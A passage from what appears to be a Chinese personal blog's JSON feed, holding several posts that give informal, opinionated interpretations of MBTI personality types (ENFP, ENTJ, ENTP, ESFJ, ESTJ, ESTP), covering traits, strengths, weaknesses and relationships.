            "content_html": "<p>每一个新鲜事物都会想要打开门进去瞅一眼，但当大致了解了这个东西的整体运作方式之后，就会失去兴趣。容易陷入天赋错觉。心态极其浮躁。</p>\n<h3 id=\"性格特征\"><a class=\"markdownIt-Anchor\" href=\"#性格特征\">#</a> 性格特征</h3>\n<p>在人际交往中总是担心会麻烦到别人，时常把他人的重要性放在自己之前，总是做一些所有人都不知道的付出。</p>\n<p>极端的喜欢和人打交道，并不完全因为喜欢社交，而是喜欢 “观察别人”。认为人生而不同，每个人都有自己独特的地方等待去挖掘，享受挖掘的过程。</p>\n<p>聊天喜欢顺着别人说，思路跳脱，天文地理无所不聊。和有深度的人聊人生聊未来，和及时行乐的人聊吃喝玩乐。</p>\n<p>总是成为别人依赖的对象，并且也确实十分享受被需要、被依赖的感觉。只要想，就可以接近任何人。</p>\n<p>容易成为别人的情绪垃圾桶，负面情绪一股脑的倒，又担心没人愿意听我说话，还得自己消化。不懂得拒绝，货真价实的工具人。</p>\n<p>注意力不集中，容易走神，不停的产生各种幻想，甚至幻听、幻视。兴趣爱好及其广泛，什么都会但什么都不精。</p>\n<p>亲和力极强，能有着一见如故的热情，但又保持着合适的距离，不会让对方感受到隐私被侵犯。</p>\n<p>看起来可能比较二，但实际上会思考一些高大上的大道理，和别人聊为人处世，工作学习的时候可以滔滔不绝。但其实思考深度不高，没有能够一眼看透事物本质的能力，比上不足比下有余。</p>\n<p>解决问题的时候往往是一堆乱七八糟的线索摆在眼前，然后突然脑袋里闪过了一道柯南那样的闪电，事情就解决了。</p>\n<p>部分存在智商歧视，但不会表露出来。和陌生人聊天有时候会仅仅三两句话就明白某些思想在他脑海里已经根深蒂固，无法撼动，会瞬间失去继续聊下去的兴趣。</p>\n<p>喜欢的人一定要聪明，理解包容能力强，端庄大方有亲和力，表达欲不能过强，要有神秘感，温柔。</p>\n<h3 id=\"优势和缺点\"><a class=\"markdownIt-Anchor\" href=\"#优势和缺点\">#</a> 优势和缺点</h3>\n<h4 id=\"优势\"><a class=\"markdownIt-Anchor\" href=\"#优势\">#</a> 优势</h4>\n<p>无忧无虑，浪漫主义者，有创造性，社交广泛，热情洋溢，精力旺盛，能量无限。</p>\n<p>充满热忱，情感丰富，活力充沛，待人热情，真诚友善，好奇心强。</p>\n<p>乐观幽默，善于言辩，有感染力，善于鼓舞和赞美别人，善于与他人合作，发现别人的长处。</p>\n<p>富有洞察力，善于体察别人的感情，喜欢社交，结识新朋友。</p>\n<p>在乎人际，人来疯，有表演欲，渴望人际关系和谐，相信世界充满爱。</p>\n<p>孩子气，视灵感高于一切，喜欢探索、挑战新事物。</p>\n<p>热爱自由，不爱被束缚，富有想象力。</p>\n<h4 id=\"缺点\"><a class=\"markdownIt-Anchor\" href=\"#缺点\">#</a> 缺点</h4>\n<p>容易过于理想化而不切实际。</p>\n<p>做事情容易注意力分散，冲动热血而带有反抗性，坚持始终如一的价值观。</p>\n<p>容易太真实而受伤，喜怒无常，过于情绪化，敏感，感性。</p>\n<p>好高骛远，极其不关注细节，健忘，心大。</p>\n<p>做事草率，对事物细节严重缺乏关注，毫无计划性，喜新厌旧，变化无常。</p>\n<p>容易的躁郁症，抑郁和躁狂无缝对接。</p>\n<h3 id=\"成熟指南\"><a class=\"markdownIt-Anchor\" href=\"#成熟指南\">#</a> 成熟指南</h3>\n<p>成熟必须要完善 Te+Si 功能，变成想法超多且有坚定执行梦想的价值观，做出最优解决定，根据自己的经验来执行。</p>\n<p>不怎么会在社交中崩溃的天然 buff，可以在社交之后建立很多个 Si 对自己非常有帮助，可以帮助 enfp 通过 Si 打破 Ne 的阴暗面。</p>\n<p>人的一辈子都在追求第一功能，enfp 所需要的就是不停通过 Te+Si 实现 Ne。Te 不停的寻找最优解，Si 记录来满足 Ne 会豁然开朗。</p>\n<p>学习的时候，Ne 是自己用 Fi+Si 搭建出来的很多经验来满足的，而不是靠 Se 来满足的，Se 毕竟是魔鬼面，靠 Se 来满足 Ne 会非常危险。</p>\n<p>把 Te 当成工具，来满足 Ne，能够自己产生新的主意来学会这个知识。逼迫自己先列出为了要学习这个知识点需要做什么，拆解成一步一步，然后每做一步学习到的知识写在自己的 excel 里。</p>\n<p>非常适合猛学顿悟式学习，为了避免学了的东西或方法忘记了，可以弄个 excel 专门记录这个上午学到了什么新的方法，这样就不会产生那种感觉什么也没做的破罐子破摔。</p>\n<p>纯用 Ne 来猛学不够，需要 Fi 来确认目标以及 Te 来设计最可靠的方案。可以用本子来记录目前最高效的学习步骤。</p>\n<p>每学一个新东西就立马回想和刚刚有什么联系，然后记录到 excel。思考我为了学会这个东西需要做什么样的计划，然后利用 Te 去寻求最优解。做完之后把自己学会的东西再记录下来形成满足感。</p>\n<p>休息的时候注意身体的休息，不要去看一些过于发散的东西。不可以为自己不执行 Te 找借口，单纯只为了满足 Ne 的阴暗面是不可以的。</p>\n<p>不可以把焦虑当成一个动力，寻求最高效的解决办法才是。休息的时候冥想、睡觉，不要看电视看电影逛小红书得一切碎片化来满足 Ne 的东西。再次强调，Ne 需要 Fi+Si 搭建出来的很多经验来满足，而不可以靠 Se 来满足。</p>\n",
            "tags": [
                "ENFP"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/ENTJ%E8%A7%A3%E8%AF%BB/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/ENTJ%E8%A7%A3%E8%AF%BB/",
            "title": "ENTJ解读",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<p>热情洋溢、远见卓识、客观公正、认真负责。机智灵活，能够服众，在多数情况下，其他人也乐得听从调遣，然后就渐渐地依赖于他们。</p>\n<h3 id=\"性格特征\"><a class=\"markdownIt-Anchor\" href=\"#性格特征\">#</a> 性格特征</h3>\n<p>喜欢指挥别人，为所有人订立计划、指明方向。总是本能地站在一个很高的角度做人和做事。</p>\n<p>善于把握住整个系统的运作情况，然后按照事情的优先顺序来协调自己和他人的工作，从而最终实现自己所预见到的远景。</p>\n<p>在阐述战略的时候有一种强大的表达能力，非常善于让别人明白自己对未来的设想以及要实现这种设想应该做些什么。</p>\n<p>动员他人的天赋本质上是一种对他人的很强的控制力，这使他们经常可以把许多人聚集在自己身边，并且经常不知不觉地就成了一个群体中的领导者。</p>\n<p>他们命令主要是方向性的，不太涉及具体细节，因为他们 N 的倾向会认为具体细节不重要。</p>\n<p>把周围的人际关系看成是一个动态的系统，然后可以迅速地抓住这个系统运行的关键点，使整个人际关系网络朝着有利于自己的方向运动。“利用矛盾、实行分化、团结多数、孤立少数”，是典型的 ENTJ 型思维。</p>\n<p>ENTJ 女性总处于一个左右为难的境地：要是她充分显示自己的工作热情，会吓倒在场的其他人；要是她抑制自己充当领导的冲动，又会因为不甘心充当一个默默的支持者而变得没有耐心、暴躁易怒。</p>\n<p>精力充沛、性格率真的战略家。能够迅速、敏锐地捕捉到机会，并立即采取行动。愿意毫无保留地把自己的观点和别人分享。</p>\n<p>他们把日常生活看成一个棋盘，为了组织的利益，人和事都不断地在这个棋盘上移动和忙碌。</p>\n<p>永远不会忘我地投入到任何一件事当中。参与讨论或者争论时充满激情，不会因为听到不中听的话而闷闷不乐。能够忧他人之忧，但是绝不会让别人的痛楚影响自己。</p>\n<p>可以设身处地地聆听别人的悲惨遭遇，但是不久就转而谈及毫无干系的事情，给别人留下冷漠、不关心他人的印象。实际原因不是 ENTJ 冷酷无情，而是他们认为既然问题已经讲了出来，“解决掉了”，那么就应该讨论下一个问题。</p>\n<p>热衷于处理复杂的事务。虽然他们有时也会把简单的问题复杂化，但是他们激励和鼓舞他人的非凡能力的确并不多见。</p>\n<p>可以把对未来的洞察力和冒险精神有机地结合起来。敢于冒险，并想清楚至少要达到什么目的。</p>\n<p>以独立工作为荣，喜欢独立性强、思维活跃的员工，鄙视 “好好先生”。认为应该大胆向苦难挑战，即使失败了也是有意义的。</p>\n<p>在表达温情、柔弱以及无助的时候会遇到相当大的困难。硬撑到底，会努力维护自己高高在上的姿态和独立自主的人格，不愿意纡尊降贵。</p>\n<p>最大的弱势在于他们的傲慢、急躁和迟钝。时常轻视学习和思辨能力不及自己的人。由于性格外向，他们总是坦率地告知别人自己对他们的看法。他们傲慢的态度会挫伤下属的自尊心，以致影响员工的士气和工作效率。</p>\n<p>客观性强，喜欢抽象思维，因而大都具备较高的智力和知识水平，通常能够在学术方面获得相当高的造诣。</p>\n<h3 id=\"领导者型人格\"><a class=\"markdownIt-Anchor\" href=\"#领导者型人格\">#</a> 领导者型人格</h3>\n<p>为了工作而生活，工作狂。野心勃勃从不掩饰。人际斗争经验丰富。有领袖魅力，自信，常常可以轻易调动起群众。办事有些不择手段，有时候又意外地很高尚。</p>\n<p>擅诡辩，社会达尔文在他们嘴里也变得清新脱俗，而且很有道理。缺乏人情味，比较容易众叛亲离。情感非常强烈，日常处于压抑状态，情感深度中等。</p>\n<p>擅长推进别人做事，工作时一点不感情用事。男性气概足、敢为人先、敢担责任、领导力足、聪明、不断进取。</p>\n<p>抗压能力、执行力相对强，做事具有目的性和计划性，为达目的可以不择手段，几乎都渴望拥有权利、资本、金钱和名誉，也就是追求世俗意义上的成功对他们来说很重要。</p>\n<p>性格相对火爆，好强，好斗，好挑战，好竞争，不服输，强势，性子急躁，极度重效率，严苛。</p>\n<p>乐于社交，外向，爱出风头 ，大多数情况下热情、自信、勇敢、大方，人生路上永远都是升级打怪通关，不见黄河不死心，不见棺材不落泪。</p>\n<p>发表观点需要理论和逻辑支撑，讨厌感情用事的人，并且不支持未经过大脑的观点输出，讨厌没主见，讨厌不合理且主观的观点，讨厌没有自己认知，讨厌听风是雨。</p>\n<p>目标十分明确，在职场上表现为工作狂，在学校里表现为学习狂魔，极大压力的推动下会急躁，但也会因为压力和一点点小失败变得更拼。</p>\n<p>自恋狂，也时常自己 pua 自己，自信的同时也有自认为非常自卑的缺陷，但也会尽全力去改正，去争取自己想要的一切。</p>\n<p>追求抱负和野心，恨不得拿下江山。极度重视效率，所以不喜欢拐弯抹角、扭扭捏捏、犹犹豫豫、郁郁寡欢、拖拖拉拉、讨厌，别人说 “” 我都行，我都可以，看你。”</p>\n<p>弱点：急于求成、急功近利、幕强、没耐心、冷漠、共情能力低、自私自利、自我中心，过于功利 、非黑即白、不考虑人事事故甚至家人、眼睛里只有自己的目的和任务、为达目的不择手段、计划被打断就会很生气、很容易暴躁。轻敌、讨厌弱者、讨厌无逻辑、很多时候会被说没有感情的工作机器，情绪忽高忽低，眺望未来的同时也容易沉浸过去。</p>\n<p>完美另一半：能赚钱，会赚钱，爱事业，温柔但也不能没有脾气，理性，健谈、幽默、谦虚、尊重、礼貌、学识、极度上进、理智且浪漫、耐心、阳光、多元、创造性、逻辑、外向、思辨且善辩，温柔浪漫，最重要的也还是为人谦逊且上进。</p>\n<p>相处底线：无逻辑、犹豫不决、没主见、经常 emo 悲观、没大脑、只会沉浸爱情的女人、恋爱脑、感情用事、没野心没追求、笨、只会干饭、没远见、怨天尤人、抱怨、懦弱无能等等。</p>\n",
            "tags": [
                "ENTJ"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/ENTP%E8%A7%A3%E8%AF%BB/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/ENTP%E8%A7%A3%E8%AF%BB/",
            "title": "ENTP解读",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<p>不甘寂寞，乐观、幽默、好奇心重，喜欢动脑筋，好争辩、创意十足，不愿意做那些他们认为枯燥无味的事情。可以叫他们发明家，智多星，冒险家。</p>\n<h3 id=\"性格特征\"><a class=\"markdownIt-Anchor\" href=\"#性格特征\">#</a> 性格特征</h3>\n<p>具备一种对系统的结构缺陷或者理论的逻辑漏洞高度敏感的品质，很容易发现理论或者优化中哪里可以改进、哪里可以优化。</p>\n<p>办法、点子和创意多，很擅长用一些别人想不到的新办法、新点子来解决各种难题，天生就是创意机器。好像灵感永远不会枯竭似的。</p>\n<p>尽量避免与 ENTP 辩论，他们是为辩而辩。会非常沉浸于与他人进行思想交锋、思维碰撞的过程。他们辩论不是为了说服对方，而是享受辩论过程本身所提供的智力和思维上的享受。</p>\n<p>适合需要不断打破旧的框架，提出创造性的新想法、新办法、新建议、新创意、新点子的工作。或者至少是对新的思路不排斥、不拒绝的工作。对墨守成规、循规蹈矩的事情或环境是最抵触的。不需要任何创意的工作和杀了他没什么两样。</p>\n<p>永无止境的好胜心。把每一天都看作挑战并努力提高自己的能力。积极进取、永不满足。</p>\n<p>喜欢帮别人解决争端。即便最终不能解决问题，这整个过程对他们来说也已经够享受的了。</p>\n<p>能预测任何事物的发展方向。即使一闪而过的灵感，他们也能牢牢抓住。可是不一会儿，他们就会有第二个、第三个乃至第五六个新想法。就像蜻蜓点水，什么都想尝试。但他们常常会只想不做，只有开头没有结尾。</p>\n<p>对生活充满幻想。认为将来就是现在，把平常的现实虚幻化了，任何事都可能发生。如果你对将来的可能产生怀疑，那他会毫不犹豫地站出来和你理论。</p>\n<p>总是能够抓住任何可能的机会享受生活。大多数有很广泛的兴趣爱好。可以同时做几项活动而不感到劳累。有充沛的精力和旺盛的创造力。</p>\n<p>容易忽视细节，而且在处理细节问题的时候会显得很没有耐心，非常容易低估一个看起来很好的想法在实现的过程中可能遇到的障碍和困难。</p>\n<p>弱点：缺乏执行力、反复无常，过于走极端，较情绪化。情绪差时，任何攻击性的语言都会从他们嘴里说出来。不能联系实际。当细节和最终期限到来时，他们会逃之夭夭。</p>\n<h3 id=\"多层面具\"><a class=\"markdownIt-Anchor\" href=\"#多层面具\">#</a> 多层面具</h3>\n<h4 id=\"最外层\"><a class=\"markdownIt-Anchor\" href=\"#最外层\">#</a> 最外层</h4>\n<p>聪慧，理性，知识面广博，思维跳跃，思想深邃而抽象，有惊人的洞见力，自信，乐观，活跃，好辩，表达欲强，热心，正义</p>\n<p>人群中的小太阳，耀眼到令人无法忽视的存在。对于精神交流和思想碰撞有着近乎狂热的追求，锋芒毕露但不显半分傲气，十分亲民。</p>\n<p>生活中是个不折不扣的乐观主义者。有时会对局势抱有不切实际的乐观心态，高估自己的实力。</p>\n<h4 id=\"第二层\"><a class=\"markdownIt-Anchor\" href=\"#第二层\">#</a> 第二层</h4>\n<p>温暖，热切，利他，宽和，包容，通达而明事理</p>\n<p>作为友人，ENTP 温暖宜人的一面得到了极尽展现。收敛锋芒后会是出色的咨询师和顾问，总能潇洒地一挥手，用 Ti 为来访者摆平一切难题。</p>\n<p>包容性极强，能够悦纳世人眼中所谓 “偏激”“黑暗” 的观点和事物，有一套独特的价值标准。善于发掘他人的潜力，激励他人，帮助他们找到属于自己的角色。话语有着鼓舞人心的力量。</p>\n<p>时常主动关心身边的朋友，给人如沐春风之感。道德感强，朋友有难必会拔刀相助，直言 “就是见不惯身边人受一分苦”。</p>\n<h4 id=\"第三层\"><a class=\"markdownIt-Anchor\" href=\"#第三层\">#</a> 第三层</h4>\n<p>永远埋藏心底，或是向 “另一个自己” 展示。冰冷，绝望，虚无，死寂，去生命化的一视同仁，道德与自我被解离，蔑视自己也蔑视一切。</p>\n<p>ta 心墙后的那个完备自洽、能够解构万物的理论系统，是一个由规律和逻辑链堆砌而成的一片死寂的世界，永无休止地运行着一次次解构与重构。</p>\n<p>在那里，社会道德被解离成为虚无，众生渺小且平等，如蝼蚁，如草芥。</p>\n<p>ENTP 所有浮夸荒唐的表演背后，尽是观棋人洞悉一切的苍凉和无奈。</p>\n<p>“也许，在某时某刻销毁自己，永远不让其他人看见如此恐怖的东西，是我仅存的善念吧。”</p>\n<h4 id=\"内心深处\"><a class=\"markdownIt-Anchor\" href=\"#内心深处\">#</a> 内心深处</h4>\n<p>内心最深处的部分，支撑他作为 “一个人” 而活着的内核，童心未泯，孩子气，纯真，清澈，柔软。</p>\n<p>这是他内心最敏感柔软、也是埋藏最深的一部分，一个 INFP 的孩童。同样爱幻想，同样情绪丰富，同样天真烂漫。</p>\n<p>这个孩子崇拜着美和情感，珍视着每一处触动心弦的美好。</p>\n<p>自言从儿时起就一直保留着这份童真和稚气，哪怕是最深陷虚无时也没有抛弃它，只是一直受着压抑。</p>\n",
            "tags": [
                "ENTP"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/ESFJ%E8%A7%A3%E8%AF%BB/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/ESFJ%E8%A7%A3%E8%AF%BB/",
            "title": "ESFJ解读",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<p>友好、富有同情心和责任感，他们把同别人的关系放在十分重要的位置，所以他们往往热心、健谈、受人欢迎、有礼貌、渴望取悦他人。</p>\n<h3 id=\"性格特征\"><a class=\"markdownIt-Anchor\" href=\"#性格特征\">#</a> 性格特征</h3>\n<p>具有和睦的人际关系，并且通过很大的努力以获得和维持这种关系。很现实，讲求实际、实事求是，安排有序，小心谨慎，也非常传统化。</p>\n<p>总会无微不至的热情满满的为你提供各种便利和服务。酒逢知己千杯少，话不投机我也说；感情浅，舔一舔，感情深，一口闷！</p>\n<p>可以简单理解为 ESFJ 是哪里人多往哪里钻，“害羞”“不熟” 这种词在 ESFJ 字典里就不存在，可以迅速和所有人打成一片并处成哥们（姐们）。</p>\n<p>会喜欢比较强势地推动周围的人主要是在物质上获得满足，使他们都过上他认为他们应该去过的那种好日子。</p>\n<p>和蔼可亲，盛情难却，无微不至，非常善于知道别人要什么，并有强烈地满足他人需要的冲动。适合从事管理工作。</p>\n<p>非常喜欢并且擅长招待大家，也就是扮演宴会主人的角色，请客送礼这些东西 ESFJ 非常擅长。比较会买东西。</p>\n<p>能很好地平衡管人和管事，亲切的激励别人，适时地鞭策员工，果断坚定、适当让步。强烈的责任感和道德观念已深深地融入他们的管理风格中，遵循自己独特的风格，希望别人也是如此。</p>\n<p>在人际关系当中，绝大多数时候都如鱼得水的 ESFJ 也不是没有缺点的，比如他们对人际关系中的不和谐状态过于敏感，总是会忍不住把人际关系中的各种瑕疵给抹平了。</p>\n<p>希望大家都和和气气的，是一家人的感觉，为了达到这个目的他们经常会花过多的时间用在调解人际关系上。</p>\n<p>很容易过于被他人的需要所吸引，而把自己的需要放在最后甚至忘掉，如果他周围的人不懂得及时关心并回报他的话，ESFJ 会陷入一个越来越辛苦的恶性循环当中。</p>\n<p>最容易过于热心，对他人的需要事无巨细都很关心，包括许多可能不是 ta 应该管的事情。</p>\n<p>如果碰上一些独立性比较强的，或者特别内向的、不喜欢他人过多干涉自己的类型，ESFJ 常常会给人一种 “多管闲事” 的感觉，这种感觉对他们的打击往往也很大。</p>\n<h3 id=\"东道主型人格\"><a class=\"markdownIt-Anchor\" href=\"#东道主型人格\">#</a> 东道主型人格</h3>\n<p>圆滑，会做人，礼貌礼节面子对他们来说很重要。热爱树立个人形象，比较在乎别人看法。表面温柔友好，不爱起冲突。有亲和力。</p>\n<p>信奉权威：长辈，老师，上级，学霸。嘴甜心硬，外热内冷，耳聪目明，擅于察言观色。正常接触他们，是很好，有魅力的人。</p>\n<p>为自己无法正面 “拒绝” 他人 —— 表达自我，甚至起冲突，而感到疲惫不堪。疲于维系人际关系，有可能产生很多怨言。把别人的事（烦心事）当做自己的事，喜欢帮人解决问题。</p>\n<p>人缘好，爱操心，恪守信用，讲规矩，负责任。很乐意向人倾斜，靠拢。心细，比较八卦，消息灵通，像个信息搜集站。</p>\n<p>会给人 “能力强”、“人好” 的印象，很吸引人，容易让人产生依赖。平静、舒缓、安稳是他们喜欢的节奏，喜欢的生活方式。</p>\n<p>信奉 “及时止损”。会说自己没什么后悔的事，坚信自己的判断。</p>\n<p>清楚现在该做什么，不该做什么。擅长安排、管理、控制，管人，管理时间、钱等，熟悉不同人的秉性，也清楚事情接下来的进展。</p>\n<p>随便去哪一个团队都是主心骨的位置，受到别人的依赖，适合一起做事。乐意帮助别人，但不愿寻求他人的帮助。</p>\n<p>别人的习惯、癖好记得很清楚，让人感到体贴。很好说话，没有攻击性，极友善，是个好人。能在不同情景展现不同形象。</p>\n<p>接触初期感觉有礼貌，如沐春风，稳重靠谱，善于倾听，幽默会讲话，形象好；接触一段时间会很让人心疼，是个忙碌的老好人，负责任，重承诺；熟了，情商其实不高，很容易焦虑、暴躁。</p>\n<p>是独立的，属于集体的。他的精力是奉献给人群的，魅力也是展现给人群的。偶尔会感到强烈的孤独：部分在失去人群后，会丢失自己。</p>\n<p>感性、感情对他来说是一种自我损耗和浪费时间。不谈恋爱的原因很可能是谁也 “看不上”。</p>\n<p>有时变得固执，不易被说服。不愿承认自己做错了，事实上他们通常做事很正确，很靠谱。可以说虚伪，会伪装，表里不一，但也是性格使然。</p>\n<p>没什么强烈的喜恶，偏好，兴趣，内心较为淡漠。价值观很世俗，比如要变强（有钱、成绩好），比如要多认识人。</p>\n<p>是倾听者，而非表达者（意指没有那么多想法需要宣泄，注意力在观察他人身上）。</p>\n<p>最能伤害他们的是让他尴尬、难堪、丢面子。</p>\n",
            "tags": [
                "ESFJ"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/ESTJ%E8%A7%A3%E8%AF%BB/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/ESTJ%E8%A7%A3%E8%AF%BB/",
            "title": "ESTJ解读",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<p>善于完成任务；喜欢操纵局势和促使事情发生；具有责任感、勤勤恳恳，信守他们的承诺；喜欢条理性并且能记住和组织安排许多细节。</p>\n<h2 id=\"性格特征\"><a class=\"markdownIt-Anchor\" href=\"#性格特征\">#</a> 性格特征</h2>\n<p>及时和尽可能高效率地、系统地开始达到目标。依据固定的规则生活，坚持不懈和值得依赖。往往很传统，有兴趣维护现存的制度。</p>\n<p>ESTJ 是天生的管理者，让所有人去做他应该做的事，让所有的东西待在应该在的地方。</p>\n<p>在 ESTJ 眼里，像法律、道德、组织的规章、纪律这些各种形式的规则是高于个人的存在，个人利益不能超越集体利益之上。</p>\n<p>在他们眼里，各种规则都应该得到严格地遵守；而 ESTJ 外向强势的气场又使他们把监督规则的执行情况，也就是维护组织纪律视为自己的责任，于是他们就会本能地成为一个监管者。</p>\n<p>说话是非常直接的，基本上很少会考虑到什么对方的个人感受，所以经常会给他周围 F 型的同事造成很大的压力。很多人会见到他就怕。</p>\n<p>他也会比较喜欢那些守规矩的朋友和同事，最不喜欢的就是那些自由散漫，或者说无组织无纪律的家伙。会认为，既然你待在组织里面，就要承担组织交给你的责任。</p>\n<p>现实、客观和理智，所以他的命令也好、训斥也罢，基本上都还是比较站得住脚的 —— 他们讲道理、更不会感情用事，永远是从现实的角度出发。</p>\n<p>管理风格是强硬、高效、细致，在他们的强控制欲下又很现实、实际，所以他们可能会事无巨细都要管，很多事情都想要亲力亲为，勤奋很能吃苦。</p>\n<p>如果你想找人完成一项工作、建立一套规则、实施一个系统或评估一项正在进行的项目，那么就去找 ESTJ 吧，他们是最合适的人选。</p>\n<p>ESTJ 男性比较适应大部分的公司规范。这些人往往是有得体的穿着、值得信赖，忠诚，恭敬，并且具有大部分绅士的特质。他们往往会不自觉地把这种观点也强加于别人。</p>\n<p>具有高统治欲的控制型，并具有高度的责任感，他们处理突发事件的能力往往有些欠缺。</p>\n<p>无法容忍那些他们所认为的组织性差、行动迟缓、衣冠不整或者举止不雅的现象，这些都会招致他们的批评。</p>\n<p>当事情失控时，ESTJ 容易发脾气、大声说话、固执、专横跋扈，使周围的人感到压力。但他们并无恶意，他们只是觉得自己应该担负起这个世界发展的使命，让人们按照这个世界本身的规则行事。</p>\n<p>等级思想也很严重，对于自己的下级、晚辈非常缺乏耐心。不太同意听取下级或者那些他们认为没有资格发表观点的人的意见。对孩子和其他非上司的人也是如此。</p>\n<p>F 偏好发展不良，ESTJ 也可能成为 16 型人格当中最没有同情心的一种类型。建议学习心理学、社会学、文学等，帮助 ESTJ 尊重他人的观点，认识到生活不仅仅只是在不断地倒计时并强制性地完成各种任务。</p>\n",
            "tags": [
                "ESTJ"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/ESTP%E8%A7%A3%E8%AF%BB/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/ESTP%E8%A7%A3%E8%AF%BB/",
            "title": "ESTP解读",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<p>灵活、忍耐力强，实际，注重结果。大都觉得理论和抽象的解释非常无趣。喜欢积极地采取行动解决问题。</p>\n<h2 id=\"性格特征\"><a class=\"markdownIt-Anchor\" href=\"#性格特征\">#</a> 性格特征</h2>\n<p>注重当前，自然不做作，享受和他人在一起的时刻。喜欢物质享受和时尚。学习新事物最有效的方式是通过亲身感受和练习。</p>\n<p>不会焦虑，他们是快乐的。活跃、随遇而安、天真率直。乐于享受现在的一切而不是为将来计划什么。喜欢处理、分解与恢复原状的真实事物。</p>\n<p>很现实，信任和依赖于自己对这个世界的感受。是好奇而热心的观察者。因为他们接受现在的一切，所以他们思维开阔，能够容忍自我和他人。</p>\n<p>喜欢行动而不是漫谈，当问题出现时，他们乐于去处理。是优秀的解决问题的人，是因为他们能够掌握必要的事实情况，然后找到符合逻辑的明智的解决途径，而无需浪费大量的努力或精力。</p>\n<p>会成为适宜外交谈判的人，乐于尝试非传统的方法，而且常常能够说服别人给他们一个妥协的机会。</p>\n<p>能够理解晦涩的原则，在符合逻辑的基础上，而不是基于他们对事物的感受之上做出决定。因此，他们讲求实效，在情况必须时非常强硬。</p>\n<p>在大多数的社交场合中，很友善，富有魅力、轻松自如而受人欢迎。他们总是爽直、多才多艺和有趣，总有笑话和故事。善于通过缓和气氛以及使冲突的双方相互协调，从而化解紧张的局面。</p>\n<p>敏锐的观察力，对实际讯息的出色记忆力。明白该做什么，明白现实的对待完成工作的必要条件。</p>\n<p>能够使工作有趣和兴奋，参加团队工作的乐趣。实际、现实的观察力和丰富的常识。逐步上升的方式，在工作中创造生动有趣的气氛。</p>\n<p>随机应变能力强。适应力，愿意冒险和尝试新事物。愿意接受不同和跟随潮流，有稳定平和的心态，有冲劲和闯劲，不患得患失。</p>\n<p>活跃、随遇而安、天真率直，乐于享受现在的一切而不是为将来计划什么。现实，心胸豁达，包容心强。喜欢行动而不是漫谈，当问题出现时，他们乐于去处理，他们是优秀的解决问题的人。</p>\n<p>喜欢随意与很多人交流，工作中充满冒险和乐趣（甚至是刺激），随时抓住机遇，更喜欢自我组织，而不是听人安排的，是活在当下自我安排命运的实践者。</p>\n<p>具有最强的随机应变的能力和最犀利的投机眼光，对于当前利益的敏感和执着使他们成为绝不吃 “眼前亏” 的类型。绝佳的口才让他们说的话永远是那么漂亮并且在表面上显得完美而无懈可击。</p>\n<p>通常被认为是忘恩负义、喜新厌旧、爱撒谎和极度地花心。他们习惯于索取，当他们有求于你的时候几乎什么话都敢说，然而如果人们要求 ESTP 兑现当初的承诺，却往往发现会落空。</p>\n<p>他们是最简单，直接，真诚。他们很少会考虑一个谎言对遥远未来的影响，说谎仅仅是因为这么做对当前的自己是有利的，因为他们太看重眼前的处境和体验，“活在当下” 的代价就是 “困在当下”。</p>\n<h2 id=\"活在当下的人格\"><a class=\"markdownIt-Anchor\" href=\"#活在当下的人格\">#</a> 活在当下的人格</h2>\n<p>Se 关注并追求眼前的最大化享受，不论是感官享受，还是风吹草动的任何对自己有利的因素，他们都能将它们迅速收入囊中。</p>\n<p>能将 Se“参与、体验、享受” 的心理过程运用得炉火纯青；习惯性对眼前的一切人事物使用 Se 功能，是他们自我满足感、自信感、自我价值感均能得以最大化的根本路径。</p>\n<p>精致的 “狡诈” 的先天特质，是他们满足 Se 自我核心信念的的外在表现，与其他类型人满足自我核心信念全无二异；这一特质可能是迷人的，也可能是令人厌恶的，关键取决于 estp 如何对其进行使用。</p>\n<p>抛开传统束缚，不盲目相信过去的经验。每一个此时此地都不与过去雷同，过去的经验又岂能保证自己适用于此刻的境况，这是 estp 离经叛道的地方，也是他们只相信随机应变原因。</p>\n<p>他们也不愿理会未知的一切未来。他们始终相信抓住眼前的机会，胜过无数充满诱人前景但却充满不确定性的未来。</p>\n<p>属于他们的只有现在，他们也只相信现在，他们甚至会怀疑明天的自己会变掉，因为他们最恒定的价值观就是变色。他们不爱承诺，同样也不愿意回应别人索要承诺；你只能够拥有此刻的他们。</p>\n<p>estp 的体验能力可以理解为 “享乐或享受” 的能力，通常表现为他们对活着这件事本身的感受：不为过去烦恼，不为未来焦虑的人生态度。因此，他们总是显得很放松。</p>\n<p>他们本性就是快乐，就是享受，他们甚至也不关注快乐本身，正如我们很少关注为什么要呼吸一样。他们充分参与，从而让自己尽情体验的根本目的，就在于获得眼前享受的最大化。</p>\n<p>正常情况下，estp 会表现出热情、友好且乐于助人的一面，但这一面只是理性思维所驱使出来的，此为他们功利性社交的倾向。别人很容易感受到 estp 的客套，并为此感到不舒服甚至是厌恶。</p>\n<p>都渴望获得长期的、友好的人际圈子，不想每次想找朋友帮忙而被婉拒时感到失落的心情。随着年龄增长，越发会在意自己在别人心目中如何被评价，渴望获得真正的友情，不再那么计较个人得失。这也是衡量大部分 estp 是否真正成熟的核心标准。</p>\n<p>大部分 estp 很少有明确的使命感，也很少思考或关注自我生命的意义。如果非要说有，那十之八九就是，娱乐至上。</p>\n<p>他们的行为理念和方式，通常遵循眼前享受最大化原则，包括从事尽可能最高收益、最小投入的工作，他们很可能频繁换工作或换项目，很难给自己机会长期深耕某一领域，即使他们也能意识到自己难以长期聚焦的特点，且认为它是缺点。</p>\n<p>人格未得到充分发展的 estp，不知道或没有充分认识到人与人之间居然还有这么多规矩。以至于他们觉得精明没什么错，但别人打压或批评时，他们想不明白背后的逻辑是什么，反倒一头雾水并觉得别人莫名其妙，仅此而已。</p>\n",
            "tags": [
                "ESTP"
            ]
        },
        {
